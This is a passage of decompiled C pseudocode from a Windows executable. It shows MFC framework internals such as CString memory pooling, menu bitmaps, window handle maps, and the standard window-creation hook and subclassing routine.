      if ( GetFocus() == *(HWND *)(v5 + 28) )
      {
        Parent = GetParent(*(HWND *)(v5 + 28));
        v7 = sub_4173F9(Parent);
        v8 = *(HWND *)(this + 20);
        if ( v8 )
          v8 = (HWND)*((_DWORD *)v8 + 7);
        NextDlgTabItem = GetNextDlgTabItem(*((HWND *)v7 + 7), v8, 0);
        v10 = sub_4173F9(NextDlgTabItem);
        sub_416EE5((int)v10);
      }
    }
    result = CWnd::ShowWindow(*(CWnd **)(this + 20), a2);
  }
  *(_DWORD *)(this + 24) = 1;
  return result;
}

//----- (00416598) --------------------------------------------------------
void __thiscall sub_416598(UINT *this, int a2)
{
  (*(void (__thiscall **)(UINT *, bool))(*this + 4))(this, a2 != 0);
  if ( this[3] )
  {
    if ( !this[4] )
    {
      if ( hBitmapChecked || (_AfxLoadDotBitmap(), hBitmapChecked) )
        SetMenuItemBitmaps(*(HMENU *)(this[3] + 4), this[2], 0x400u, 0, hBitmapChecked);
    }
  }
}

//----- (004165EE) --------------------------------------------------------
void __thiscall sub_4165EE(UINT_PTR *this, LPCSTR lpNewItem)
{
  UINT_PTR v3; // eax
  UINT MenuState; // eax

  v3 = this[3];
  if ( v3 )
  {
    if ( !this[4] )
    {
      MenuState = GetMenuState(*(HMENU *)(v3 + 4), this[2], 0x400u);
      LOWORD(MenuState) = MenuState & 0xF6FB;
      ModifyMenuA(*(HMENU *)(this[3] + 4), this[2], MenuState | 0x400, this[1], lpNewItem);
    }
  }
  else
  {
    AfxSetWindowText(*(HWND *)(this[5] + 28), lpNewItem);
  }
}

//----- (0041665F) --------------------------------------------------------
void *__cdecl sub_41665F(size_t Size)
{
  void *v1; // esi

  v1 = malloc(Size);
  if ( !v1 && off_426678 )
    off_426678(Size);
  return v1;
}
// 416645: using guessed type void __noreturn sub_416645();
// 426678: using guessed type int (__cdecl *off_426678)(_DWORD);

//----- (00416688) --------------------------------------------------------
void __cdecl sub_416688(LPVOID lpMem)
{
  sub_40AD16(lpMem);
}

//----- (00416693) --------------------------------------------------------
CString *__thiscall sub_416693(CString *this, LPCSTR *a2)
{
  LPCSTR v3; // eax

  v3 = *a2;
  if ( *((int *)*a2 - 3) < 0 )
  {
    *(_DWORD *)this = off_42667C;
    CString::operator=(this, *a2);
  }
  else
  {
    *(_DWORD *)this = v3;
    InterlockedIncrement((volatile LONG *)v3 - 3);
  }
  return this;
}
// 42667C: using guessed type void *off_42667C;

//----- (004166C6) --------------------------------------------------------
int sub_4166C6()
{
  sub_4166D0();
  return atexit(sub_4166EB);
}

//----- (004166D0) --------------------------------------------------------
char *sub_4166D0()
{
  return sub_40A4D2(byte_4428B0, 80, 64);
}

//----- (004166EB) --------------------------------------------------------
void __cdecl sub_4166EB()
{
  sub_40A50E((int)byte_4428B0);
  DeleteCriticalSection((LPCRITICAL_SECTION)&byte_4428B0[16]);
}

//----- (004166F5) --------------------------------------------------------
int sub_4166F5()
{
  sub_4166FF();
  return atexit(sub_41671D);
}

//----- (004166FF) --------------------------------------------------------
char *sub_4166FF()
{
  return sub_40A4D2(byte_442888, 144, 64);
}

//----- (0041671D) --------------------------------------------------------
void __cdecl sub_41671D()
{
  sub_40A50E((int)&unk_442888);
  DeleteCriticalSection((LPCRITICAL_SECTION)((char *)&unk_442888 + 16));
}

//----- (00416727) --------------------------------------------------------
int sub_416727()
{
  sub_416731();
  return atexit(sub_41674F);
}

//----- (00416731) --------------------------------------------------------
char *sub_416731()
{
  return sub_40A4D2(byte_442860, 272, 64);
}

//----- (0041674F) --------------------------------------------------------
void __cdecl sub_41674F()
{
  sub_40A50E((int)&unk_442860);
  DeleteCriticalSection((LPCRITICAL_SECTION)((char *)&unk_442860 + 16));
}

//----- (00416759) --------------------------------------------------------
int sub_416759()
{
  sub_416763();
  return atexit(sub_416781);
}

//----- (00416763) --------------------------------------------------------
char *sub_416763()
{
  return sub_40A4D2(byte_442838, 528, 64);
}

//----- (00416781) --------------------------------------------------------
void __cdecl sub_416781()
{
  sub_40A50E((int)&unk_442838);
  DeleteCriticalSection((LPCRITICAL_SECTION)((char *)&unk_442838 + 16));
}

//----- (0041678B) --------------------------------------------------------
void *__thiscall sub_41678B(_DWORD *this, int a2)
{
  void *result; // eax
  int v4; // edi
  char *v5; // ecx
  _DWORD *v6; // eax

  if ( !a2 )
  {
    result = off_42667C;
    *this = off_42667C;
    return result;
  }
  v4 = 64;
  if ( a2 > 64 )
  {
    v4 = 128;
    if ( a2 > 128 )
    {
      v4 = 256;
      if ( a2 > 256 )
      {
        v4 = 512;
        if ( a2 > 512 )
        {
          v6 = sub_41665F(a2 + 13);
          v6[2] = a2;
          goto LABEL_13;
        }
        v5 = (char *)&unk_442838;
      }
      else
      {
        v5 = (char *)&unk_442860;
      }
    }
    else
    {
      v5 = (char *)&unk_442888;
    }
  }
  else
  {
    v5 = (char *)&unk_4428B0;
  }
  v6 = sub_40A536(v5);
  v6[2] = v4;
LABEL_13:
  *v6 = 1;
  *((_BYTE *)v6 + a2 + 12) = 0;
  v6[1] = a2;
  result = v6 + 3;
  *this = result;
  return result;
}
// 42667C: using guessed type void *off_42667C;

//----- (0041680D) --------------------------------------------------------
void __thiscall sub_41680D(_DWORD *lpMem)
{
  int v1; // eax
  void *v2; // ecx
  _DWORD *v3; // [esp-4h] [ebp-4h]

  v1 = lpMem[2];
  switch ( v1 )
  {
    case 64:
      v3 = lpMem;
      v2 = &unk_4428B0;
      break;
    case 128:
      sub_40A5C5((int)&unk_442888, lpMem);
      return;
    case 256:
      sub_40A5C5((int)&unk_442860, lpMem);
      return;
    default:
      v3 = lpMem;
      if ( v1 != 512 )
      {
        sub_416688(lpMem);
        return;
      }
      v2 = &unk_442838;
      break;
  }
  sub_40A5C5((int)v2, v3);
}

//----- (00416855) --------------------------------------------------------
volatile LONG *__thiscall sub_416855(void **this)
{
  volatile LONG *result; // eax

  result = (volatile LONG *)*this;
  if ( (char *)*this - 12 != off_426680 )
  {
    if ( InterlockedDecrement(result - 3) <= 0 )
      sub_41680D((_DWORD *)*this - 3);
    result = (volatile LONG *)off_42667C;
    *this = off_42667C;
  }
  return result;
}
// 42667C: using guessed type void *off_42667C;
// 426680: using guessed type void *off_426680;

//----- (00416886) --------------------------------------------------------
void __stdcall sub_416886(volatile LONG *lpAddend)
{
  if ( lpAddend != off_426680 && InterlockedDecrement(lpAddend) <= 0 )
    sub_41680D(lpAddend);
}
// 426680: using guessed type void *off_426680;

//----- (0041691E) --------------------------------------------------------
void __thiscall sub_41691E(_DWORD *this)
{
  if ( (void *)(*this - 12) != off_426680 && InterlockedDecrement((volatile LONG *)(*this - 12)) <= 0 )
    sub_41680D((_DWORD *)(*this - 12));
}
// 426680: using guessed type void *off_426680;

//----- (00416948) --------------------------------------------------------
_DWORD *__thiscall sub_416948(_DWORD *this, _DWORD *a2, size_t Size, int a4, int a5)
{
  _DWORD *result; // eax

  if ( Size + a5 )
  {
    sub_41678B(a2, Size + a5);
    return memcpy_0((void *)*a2, (const void *)(a4 + *this), Size);
  }
  else
  {
    result = a2;
    *a2 = off_42667C;
  }
  return result;
}
// 42667C: using guessed type void *off_42667C;

//----- (0041698C) --------------------------------------------------------
CString *__thiscall sub_41698C(CString *this, LPCSTR lpString)
{
  int v3; // eax
  size_t v4; // edi

  *(_DWORD *)this = off_42667C;
  if ( lpString )
  {
    if ( HIWORD(lpString) )
    {
      v3 = lstrlenA(lpString);
      v4 = v3;
      if ( v3 )
      {
        sub_41678B(this, v3);
        memcpy_0(*(void **)this, lpString, v4);
      }
    }
    else
    {
      CString::LoadStringA(this, (unsigned __int16)lpString);
    }
  }
  return this;
}
// 42667C: using guessed type void *off_42667C;

//----- (00416A0B) --------------------------------------------------------
void **__thiscall sub_416A0B(void **this, const char **a2)
{
  int *v3; // ecx
  const char *v4; // eax
  const char *v5; // eax

  v3 = (int *)*this;
  v4 = *a2;
  if ( v3 != (int *)*a2 )
  {
    if ( (*(v3 - 3) >= 0 || v3 - 3 == off_426680) && *((int *)v4 - 3) >= 0 )
    {
      sub_416855(this);
      v5 = *a2;
      *this = (void *)*a2;
      InterlockedIncrement((volatile LONG *)v5 - 3);
    }
    else
    {
      CString::AssignCopy((CString *)this, *((_DWORD *)v4 - 2), *a2);
    }
  }
  return this;
}
// 426680: using guessed type void *off_426680;

//----- (00416AC3) --------------------------------------------------------
void *__thiscall sub_416AC3(void **this, size_t Size, void *Src, size_t a4, void *a5)
{
  void *result; // eax

  result = (void *)(Size + a4);
  if ( Size + a4 )
  {
    sub_41678B(this, Size + a4);
    memcpy_0(*this, Src, Size);
    return memcpy_0((char *)*this + Size, a5, a4);
  }
  return result;
}

//----- (00416B01) --------------------------------------------------------
void __thiscall sub_416B01(void **this, size_t Size, void *Src)
{
  _DWORD *v4; // eax
  volatile LONG *v5; // ebx
  int v6; // ecx

  if ( Size )
  {
    v4 = *this;
    v5 = (volatile LONG *)((char *)*this - 12);
    if ( *(int *)v5 > 1 || (v6 = *(v4 - 2), (signed int)(v6 + Size) > *(v4 - 1)) )
    {
      sub_416AC3(this, *(v4 - 2), v4, Size, Src);
      sub_416886(v5);
    }
    else
    {
      memcpy_0((char *)v4 + v6, Src, Size);
      *((_DWORD *)*this - 2) += Size;
      *((_BYTE *)*this + *((_DWORD *)*this - 2)) = 0;
    }
  }
}

//----- (00416B60) --------------------------------------------------------
void **__thiscall sub_416B60(void **this, CHAR *lpString)
{
  int v3; // eax

  if ( lpString )
    v3 = lstrlenA(lpString);
  else
    v3 = 0;
  sub_416B01(this, v3, lpString);
  return this;
}

//----- (00416B9F) --------------------------------------------------------
_DWORD *__thiscall sub_416B9F(_DWORD *this, int a2)
{
  int v3; // ecx
  _DWORD *v4; // eax
  volatile LONG *v5; // ebx
  int v6; // edi

  v3 = a2;
  v4 = (_DWORD *)*this;
  v5 = (volatile LONG *)(*this - 12);
  if ( *(int *)v5 > 1 || a2 > *(v4 - 1) )
  {
    v6 = *(v4 - 2);
    if ( a2 < v6 )
      v3 = *(v4 - 2);
    sub_41678B(this, v3);
    memcpy_0((void *)*this, (const void *)(v5 + 3), v6 + 1);
    *(_DWORD *)(*this - 8) = v6;
    sub_416886(v5);
  }
  return (_DWORD *)*this;
}

//----- (00416C6C) --------------------------------------------------------
char **sub_416C6C()
{
  return &off_41F768;
}
// 41F768: using guessed type char *off_41F768;

//----- (00416C84) --------------------------------------------------------
int __thiscall sub_416C84(_DWORD *this)
{
  int result; // eax
  bool v2; // zf
  int v3; // [esp+0h] [ebp-24h] BYREF
  int v4; // [esp+10h] [ebp-14h]
  int *v5; // [esp+14h] [ebp-10h]
  int v6; // [esp+20h] [ebp-4h]

  result = 0;
  v2 = this[3] == 0;
  v5 = &v3;
  if ( !v2 )
  {
    v4 = 0;
    v6 = 0;
    return ((int (*)(void))this[3])();
  }
  return result;
}

//----- (00416CCA) --------------------------------------------------------
void __stdcall sub_416CCA(void *a1)
{
  struct AFX_MODULE_STATE *ModuleState; // esi

  ModuleState = AfxGetModuleState();
  sub_41C3BC(0);
  CSimpleList::AddHead((struct AFX_MODULE_STATE *)((char *)ModuleState + 28), a1);
  AfxUnlockGlobals(0);
}

//----- (00416D31) --------------------------------------------------------
int __thiscall sub_416D31(void *this, UINT uType, unsigned int a3)
{
  CHAR Text[512]; // [esp+0h] [ebp-204h] BYREF
  int v5; // [esp+200h] [ebp-4h] BYREF

  if ( (*(int (__thiscall **)(void *, CHAR *, int, int *))(*(_DWORD *)this + 12))(this, Text, 512, &v5) )
    return sub_41A9A7(Text, uType, v5);
  if ( !a3 )
    a3 = 61472;
  return sub_41A9DF(a3, uType, v5);
}

//----- (00416DE2) --------------------------------------------------------
int __thiscall sub_416DE2(_DWORD **this, int a2, int a3, int a4)
{
  return (*(int (__thiscall **)(_DWORD *, int, int, int))(*this[13] + 84))(this[13], a2, a3, a4);
}

//----- (00416DF9) --------------------------------------------------------
LONG __thiscall sub_416DF9(int this)
{
  int v1; // eax

  v1 = *(_DWORD *)(this + 56);
  if ( v1 )
    return (*(int (__thiscall **)(_DWORD))(*(_DWORD *)v1 + 112))(*(_DWORD *)(this + 56));
  else
    return GetWindowLongA(*(HWND *)(this + 28), -16);
}

//----- (00416E13) --------------------------------------------------------
LONG __thiscall sub_416E13(int this)
{
  int v1; // eax

  v1 = *(_DWORD *)(this + 56);
  if ( v1 )
    return (*(int (__thiscall **)(_DWORD))(*(_DWORD *)v1 + 116))(*(_DWORD *)(this + 56));
  else
    return GetWindowLongA(*(HWND *)(this + 28), -20);
}

//----- (00416E7C) --------------------------------------------------------
int __thiscall sub_416E7C(int this, int nCmdShow)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 56);
  if ( v2 )
    return (*(int (__thiscall **)(int, int))(*(_DWORD *)v2 + 160))(v2, nCmdShow);
  else
    return ShowWindow(*(HWND *)(this + 28), nCmdShow);
}

//----- (00416EA3) --------------------------------------------------------
int __thiscall sub_416EA3(int this)
{
  int v1; // eax

  v1 = *(_DWORD *)(this + 56);
  if ( v1 )
    return (*(int (__thiscall **)(_DWORD))(*(_DWORD *)v1 + 164))(*(_DWORD *)(this + 56));
  else
    return IsWindowEnabled(*(HWND *)(this + 28));
}

//----- (00416EE5) --------------------------------------------------------
struct CObject *__thiscall sub_416EE5(int this)
{
  int v1; // eax
  HWND v2; // eax

  v1 = *(_DWORD *)(this + 56);
  if ( v1 )
    return (struct CObject *)(*(int (__thiscall **)(_DWORD))(*(_DWORD *)v1 + 172))(*(_DWORD *)(this + 56));
  v2 = SetFocus(*(HWND *)(this + 28));
  return sub_4173F9(v2);
}

//----- (00416F06) --------------------------------------------------------
void __thiscall sub_416F06(int this, int a2)
{
  HWND Parent; // eax
  _DWORD *ValueAt; // eax
  int v5; // eax

  if ( this )
  {
    if ( !*(_DWORD *)(this + 56) )
    {
      Parent = GetParent(*(HWND *)(this + 28));
      ValueAt = CMapPtrToPtr::GetValueAt((CMapPtrToPtr *)(a2 + 4), Parent);
      if ( ValueAt )
      {
        v5 = ValueAt[13];
        if ( v5 )
          (*(void (__thiscall **)(int, int))(*(_DWORD *)v5 + 140))(v5, this);
      }
    }
  }
}

//----- (00416F48) --------------------------------------------------------
UINT sub_416F48()
{
  UINT result; // eax

  result = RegisterWindowMessageA("commctrl_DragListMsg");
  dword_444554 = result;
  return result;
}
// 444554: using guessed type int dword_444554;

//----- (00416F59) --------------------------------------------------------
int sub_416F59()
{
  sub_416F63();
  return atexit(unknown_libname_20);
}

//----- (00416F63) --------------------------------------------------------
_DWORD *sub_416F63()
{
  return sub_41708F(dword_444518, 0);
}
// 444518: using guessed type _DWORD dword_444518[15];

//----- (00416F97) --------------------------------------------------------
int sub_416F97()
{
  sub_416FA1();
  return atexit(unknown_libname_21);
}

//----- (00416FA1) --------------------------------------------------------
_DWORD *sub_416FA1()
{
  return sub_41708F(dword_4444D8, 1);
}
// 4444D8: using guessed type _DWORD dword_4444D8[15];

//----- (00416FD5) --------------------------------------------------------
int sub_416FD5()
{
  sub_416FDF();
  return atexit(unknown_libname_22);
}

//----- (00416FDF) --------------------------------------------------------
_DWORD *sub_416FDF()
{
  return sub_41708F(dword_444498, -1);
}
// 444498: using guessed type _DWORD dword_444498[16];

//----- (00417013) --------------------------------------------------------
int sub_417013()
{
  sub_41701D();
  return atexit(unknown_libname_23);
}

//----- (0041701D) --------------------------------------------------------
_DWORD *sub_41701D()
{
  return sub_41708F(dword_444458, -2);
}
// 444458: using guessed type _DWORD dword_444458[16];

//----- (00417051) --------------------------------------------------------
_DWORD *__thiscall sub_417051(_DWORD *this)
{
  sub_416192(this);
  *this = &off_41FD50;
  memset(this + 7, 0, 0x20u);
  return this;
}
// 41FD50: using guessed type int (*off_41FD50)();

//----- (00417073) --------------------------------------------------------
CWnd *__thiscall sub_417073(CWnd *lpMem, char a2)
{
  CWnd::~CWnd(lpMem);
  if ( (a2 & 1) != 0 )
    sub_416688(lpMem);
  return lpMem;
}

//----- (0041708F) --------------------------------------------------------
_DWORD *__thiscall sub_41708F(_DWORD *this, int a2)
{
  sub_416192(this);
  *this = &off_41FD50;
  memset(this + 7, 0, 0x20u);
  this[7] = a2;
  return this;
}
// 41FD50: using guessed type int (*off_41FD50)();

//----- (0041722E) --------------------------------------------------------
struct CWnd *__stdcall sub_41722E(struct CWnd *a1, unsigned int a2, CException *a3, int a4, int a5)
{
  struct CNoTrackObject *Data; // ebx
  CException *v6; // esi
  int v8; // eax
  int v9; // ecx
  struct CWnd *result; // eax
  int v11; // [esp+0h] [ebp-4Ch] BYREF
  char v12[28]; // [esp+Ch] [ebp-40h] BYREF
  struct tagRECT Rect; // [esp+28h] [ebp-24h] BYREF
  struct CNoTrackObject *v14; // [esp+38h] [ebp-14h]
  int *v15; // [esp+3Ch] [ebp-10h]
  int v16; // [esp+48h] [ebp-4h]
  struct CWnd *v17; // [esp+54h] [ebp+8h]

  v15 = &v11;
  Data = CThreadLocalObject::GetData((CThreadLocalObject *)&unk_442A6C, CThreadLocal<_AFX_THREAD_STATE>::CreateObject);
  v16 = 0;
  v14 = Data;
  qmemcpy(v12, (char *)Data + 52, sizeof(v12));
  v6 = a3;
  *((_DWORD *)Data + 13) = a2;
  *((_DWORD *)Data + 15) = a4;
  v8 = a5;
  *((_DWORD *)Data + 14) = v6;
  *((_DWORD *)Data + 16) = v8;
  if ( v6 == (CException *)2 )
  {
    v9 = *((_DWORD *)a1 + 13);
    if ( v9 )
      (*(void (__thiscall **)(int, _DWORD))(*(_DWORD *)v9 + 92))(v9, 0);
  }
  a2 = 0;
  if ( v6 == (CException *)272 )
    _AfxPreInitDialog(a1, &Rect, &a2);
  v17 = (struct CWnd *)(*(int (__thiscall **)(struct CWnd *, CException *, int, int))(*(_DWORD *)a1 + 152))(
                         a1,
                         v6,
                         a4,
                         a5);
  if ( v6 == (CException *)272 )
    _AfxPostInitDialog(a1, &Rect, a2);
  result = v17;
  qmemcpy((char *)Data + 52, v12, 0x1Cu);
  return result;
}

//----- (00417360) --------------------------------------------------------
int __thiscall sub_417360(void *this)
{
  struct CNoTrackObject *Data; // eax

  Data = CThreadLocalObject::GetData((CThreadLocalObject *)&unk_442A6C, CThreadLocal<_AFX_THREAD_STATE>::CreateObject);
  return (*(int (__thiscall **)(void *, _DWORD, _DWORD, _DWORD))(*(_DWORD *)this + 160))(
           this,
           *((_DWORD *)Data + 14),
           *((_DWORD *)Data + 15),
           *((_DWORD *)Data + 16));
}

//----- (004173F9) --------------------------------------------------------
struct CObject *__stdcall sub_4173F9(void *a1)
{
  CHandleMap *v1; // esi
  struct CObject *v2; // edi

  v1 = afxMapHWND((LPVOID)1);
  v2 = CHandleMap::FromHandle(v1, a1);
  sub_416F06((int)v2, (int)v1);
  return v2;
}

//----- (00417420) --------------------------------------------------------
void *__stdcall sub_417420(void *a1)
{
  struct CHandleMap *v1; // ecx
  void *result; // eax

  v1 = afxMapHWND(0);
  result = 0;
  if ( v1 )
    return CMapPtrToPtr::GetValueAt((struct CHandleMap *)((char *)v1 + 4), a1);
  return result;
}

//----- (0041743E) --------------------------------------------------------
int __thiscall sub_41743E(_DWORD *this, int a2)
{
  struct CHandleMap *v4; // edi

  if ( !a2 )
    return 0;
  v4 = afxMapHWND((LPVOID)1);
  this[7] = a2;
  *sub_4158EF((_DWORD *)v4 + 1, a2) = (int)this;
  sub_416F06((int)this, (int)v4);
  return 1;
}

//----- (00417477) --------------------------------------------------------
unsigned int __thiscall sub_417477(unsigned int *this)
{
  unsigned int v2; // edi
  struct CHandleMap *v3; // eax

  v2 = this[7];
  if ( v2 )
  {
    v3 = afxMapHWND(0);
    if ( v3 )
      sub_41593F((_DWORD *)v3 + 1, this[7]);
    this[7] = 0;
  }
  this[14] = 0;
  return v2;
}

//----- (004174A6) --------------------------------------------------------
LRESULT __stdcall sub_4174A6(HWND hWnd, CException *Msg, WPARAM wParam, LPARAM lParam)
{
  HWND *v5; // eax

  if ( Msg == (CException *)864 )
    return 1;
  v5 = (HWND *)sub_417420(hWnd);
  if ( v5 && v5[7] == hWnd )
    return (LRESULT)sub_41722E((struct CWnd *)v5, (unsigned int)hWnd, Msg, wParam, lParam);
  else
    return DefWindowProcA(hWnd, (UINT)Msg, wParam, lParam);
}

//----- (004174F1) --------------------------------------------------------
LRESULT (__stdcall *sub_4174F1())(HWND hWnd, CException *Msg, WPARAM wParam, LPARAM lParam)
{
  return sub_4174A6;
}

//----- (004174F7) --------------------------------------------------------
LRESULT __stdcall sub_4174F7(HWND hWnd, UINT Msg, WPARAM wParam, unsigned int lParam)
{
  LRESULT (__stdcall *PropA)(HWND, UINT, WPARAM, LPARAM); // eax
  BOOL v5; // ebx
  struct CWnd *v6; // esi
  ATOM AtomA; // ax
  struct CWnd *v9; // eax
  struct CWnd *v10; // esi
  struct CWnd *v11; // eax
  int v12; // [esp+0h] [ebp-58h] BYREF
  struct tagRECT Rect; // [esp+28h] [ebp-30h] BYREF
  __int16 v14[2]; // [esp+3Ch] [ebp-1Ch] BYREF
  WNDPROC lpPrevWndFunc; // [esp+40h] [ebp-18h]
  LRESULT v16; // [esp+44h] [ebp-14h]
  int *v17; // [esp+48h] [ebp-10h]
  int v18; // [esp+54h] [ebp-4h]

  v17 = &v12;
  PropA = (LRESULT (__stdcall *)(HWND, UINT, WPARAM, LPARAM))GetPropA(hWnd, "AfxOldWndProc423");
  v16 = 0;
  v18 = 0;
  lpPrevWndFunc = PropA;
  v5 = 1;
  switch ( Msg )
  {
    case 6u:
      v10 = sub_4173F9((void *)lParam);
      v11 = sub_4173F9(hWnd);
      _AfxHandleActivate(v11, wParam, v10);
LABEL_10:
      if ( !v5 )
        return v16;
      return CallWindowProcA(lpPrevWndFunc, hWnd, Msg, wParam, lParam);
    case 0x20u:
      v9 = sub_4173F9(hWnd);
      v5 = _AfxHandleSetCursor(v9, (__int16)lParam, HIWORD(lParam)) == 0;
      goto LABEL_10;
    case 0x82u:
      SetWindowLongA(hWnd, -4, (LONG)lpPrevWndFunc);
      RemovePropA(hWnd, "AfxOldWndProc423");
      AtomA = GlobalFindAtomA("AfxOldWndProc423");
      GlobalDeleteAtom(AtomA);
      return CallWindowProcA(lpPrevWndFunc, hWnd, Msg, wParam, lParam);
  }
  if ( Msg != 272 )
    return CallWindowProcA(lpPrevWndFunc, hWnd, Msg, wParam, lParam);
  v6 = sub_4173F9(hWnd);
  _AfxPreInitDialog(v6, &Rect, (unsigned int *)v14);
  v16 = CallWindowProcA(lpPrevWndFunc, hWnd, 0x110u, wParam, lParam);
  _AfxPostInitDialog(v6, &Rect, v14[0]);
  return v16;
}

//----- (004176D2) --------------------------------------------------------
LRESULT __stdcall sub_4176D2(int code, HWND wParam, int *lParam)
{
  struct CNoTrackObject *Data; // eax
  struct CWnd *v5; // esi
  int v6; // edi
  int v7; // eax
  CHAR *v9; // eax
  int v10; // edi
  BOOL v11; // esi
  LONG v12; // eax
  LRESULT (__stdcall *v13)(HWND, CException *, WPARAM, LPARAM); // esi
  int v14; // esi
  LRESULT (__stdcall *v15)(HWND, UINT, WPARAM, unsigned int); // eax
  LRESULT v16; // edi
  CHAR Buffer[4]; // [esp+0h] [ebp-10h] BYREF
  int v18; // [esp+8h] [ebp-8h]
  struct CNoTrackObject *v19; // [esp+Ch] [ebp-4h]
  LRESULT (__stdcall *nCode)(HWND, CException *, WPARAM, LPARAM); // [esp+18h] [ebp+8h]
  HANDLE nCodea; // [esp+18h] [ebp+8h]
  LONG *wParama; // [esp+1Ch] [ebp+Ch]

  Data = CThreadLocalObject::GetData((CThreadLocalObject *)&unk_442A6C, CThreadLocal<_AFX_THREAD_STATE>::CreateObject);
  v19 = Data;
  if ( code != 3 )
    return CallNextHookEx(*((HHOOK *)Data + 11), code, (WPARAM)wParam, (LPARAM)lParam);
  v5 = (struct CWnd *)*((_DWORD *)Data + 5);
  v6 = *lParam;
  v7 = *((unsigned __int8 *)AfxGetModuleState() + 20);
  v18 = v7;
  if ( !v5 && ((*(_BYTE *)(v6 + 35) & 0x40) != 0 || v7) )
    goto LABEL_28;
  if ( dword_4447E4 )
  {
    if ( (GetClassLongA(wParam, -26) & 0x10000) != 0 )
      goto LABEL_28;
    v9 = *(CHAR **)(v6 + 40);
    if ( !HIWORD(v9) )
    {
      Buffer[0] = 0;
      GlobalGetAtomNameA(*(_WORD *)(v6 + 40), Buffer, 5);
      v9 = Buffer;
    }
    if ( !lstrcmpiA(v9, "ime") )
      goto LABEL_28;
  }
  if ( !v5 )
  {
    nCodea = (HANDLE)GetWindowLongA(wParam, -4);
    if ( nCodea )
    {
      if ( !GetPropA(wParam, "AfxOldWndProc423") )
      {
        SetPropA(wParam, "AfxOldWndProc423", nCodea);
        if ( GetPropA(wParam, "AfxOldWndProc423") == nCodea )
        {
          GlobalAddAtomA("AfxOldWndProc423");
          v15 = (LRESULT (__stdcall *)(HWND, UINT, WPARAM, unsigned int))_AfxGrayBackgroundWndProc;
          if ( !*((_DWORD *)v19 + 10) )
            v15 = sub_4174F7;
          SetWindowLongA(wParam, -4, (LONG)v15);
        }
      }
    }
LABEL_28:
    v14 = (int)v19;
    goto LABEL_29;
  }
  sub_41743E(v5, (int)wParam);
  (*(void (__thiscall **)(struct CWnd *))(*(_DWORD *)v5 + 80))(v5);
  wParama = (LONG *)(*(int (__thiscall **)(struct CWnd *))(*(_DWORD *)v5 + 128))(v5);
  if ( !dword_4447CC
    && !v18
    && (v10 = dword_4447E0) != 0
    && *(_DWORD *)(dword_4447E0 + 32)
    && (*(_DWORD *)Buffer = sub_41722E(v5, (unsigned int)wParam, (CException *)0x36F, 0, 0)) != 0 )
  {
    nCode = sub_4174F1();
    v11 = nCode == (LRESULT (__stdcall *)(HWND, CException *, WPARAM, LPARAM))GetWindowLongA(wParam, -4);
    (*(void (__stdcall **)(HWND, _DWORD))(v10 + 32))(wParam, *(_DWORD *)Buffer);
    if ( !v11 )
    {
      v12 = SetWindowLongA(wParam, -4, (LONG)nCode);
LABEL_20:
      *wParama = v12;
    }
  }
  else
  {
    v13 = sub_4174F1();
    v12 = SetWindowLongA(wParam, -4, (LONG)v13);
    if ( (LRESULT (__stdcall *)(HWND, CException *, WPARAM, LPARAM))v12 != v13 )
      goto LABEL_20;
  }
  v14 = (int)v19;
  *((_DWORD *)v19 + 5) = 0;
LABEL_29:
  v16 = CallNextHookEx(*(HHOOK *)(v14 + 44), 3, (WPARAM)wParam, (LPARAM)lParam);
  if ( v18 )
  {
    UnhookWindowsHookEx(*(HHOOK *)(v14 + 44));
    *(_DWORD *)(v14 + 44) = 0;
  }
  return v16;
}
// 4447CC: using guessed type int dword_4447CC;
// 4447E4: using guessed type int dword_4447E4;

//----- (00417956) --------------------------------------------------------
BOOL __thiscall sub_417956(
        struct CWnd *this,
        int a2,
        const CHAR *a3,
        const CHAR *a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        HWND a10,
        HMENU a11,
        void *a12)
{
  HWND Window; // edi
  LPVOID lpParam; // [esp+4h] [ebp-30h] BYREF
  HINSTANCE hInstance; // [esp+8h] [ebp-2Ch]
  HMENU hMenu; // [esp+Ch] [ebp-28h]
  HWND hWndParent; // [esp+10h] [ebp-24h]
  int nHeight; // [esp+14h] [ebp-20h]
  int nWidth; // [esp+18h] [ebp-1Ch]
  int Y; // [esp+1Ch] [ebp-18h]
  int X; // [esp+20h] [ebp-14h]
  DWORD dwStyle; // [esp+24h] [ebp-10h]
  LPCSTR lpWindowName; // [esp+28h] [ebp-Ch]
  LPCSTR lpClassName; // [esp+2Ch] [ebp-8h]
  DWORD dwExStyle; // [esp+30h] [ebp-4h]

  dwExStyle = a2;
  lpClassName = a3;
  lpWindowName = a4;
  dwStyle = a5;
  X = a6;
  Y = a7;
  nWidth = a8;
  nHeight = a9;
  hWndParent = a10;
  hMenu = a11;
  hInstance = (HINSTANCE)*((_DWORD *)AfxGetModuleState() + 2);
  lpParam = a12;
  if ( (*(int (__thiscall **)(struct CWnd *, LPVOID *))(*(_DWORD *)this + 92))(this, &lpParam) )
  {
    AfxHookWindowCreate(this);
    Window = CreateWindowExA(
               dwExStyle,
               lpClassName,
               lpWindowName,
               dwStyle,
               X,
               Y,
               nWidth,
               nHeight,
               hWndParent,
               hMenu,
               hInstance,
               lpParam);
    if ( !AfxUnhookWindowCreate() )
      (*(void (__thiscall **)(struct CWnd *))(*(_DWORD *)this + 164))(this);
    return Window != 0;
  }
  else
  {
    (*(void (__thiscall **)(struct CWnd *))(*(_DWORD *)this + 164))(this);
    return 0;
  }
}

//----- (00417A1C) --------------------------------------------------------
int __stdcall sub_417A1C(int a1)
{
  if ( !*(_DWORD *)(a1 + 40) )
  {
    sub_419290(1);
    *(_DWORD *)(a1 + 40) = "AfxWnd42s";
  }
  return 1;
}

//----- (00417A3C) --------------------------------------------------------
BOOL __thiscall sub_417A3C(
        struct CWnd *this,
        const CHAR *a2,
        const CHAR *a3,
        int a4,
        int *a5,
        int a6,
        HMENU a7,
        void *a8)
{
  HWND v8; // edi

  if ( a6 )
    v8 = *(HWND *)(a6 + 28);
  else
    v8 = 0;
  return sub_417956(this, 0, a2, a3, a4 | 0x40000000, *a5, a5[1], a5[2] - *a5, a5[3] - a5[1], v8, a7, a8);
}

//----- (00417C34) --------------------------------------------------------
int __thiscall sub_417C34(int *this)
{
  int v1; // eax

  v1 = *this;
  if ( this[7] )
    return (*(int (**)(void))(v1 + 88))();
  else
    return (*(int (**)(void))(v1 + 164))();
}

//----- (00417C45) --------------------------------------------------------
int __thiscall sub_417C45(int this)
{
  struct CHandleMap *v3; // eax
  void *ValueAt; // eax
  int v5; // ecx
  void *v6; // edi
  int v7; // eax
  int v8; // ebx

  if ( !*(_DWORD *)(this + 28) )
    return 0;
  v3 = afxMapHWND(0);
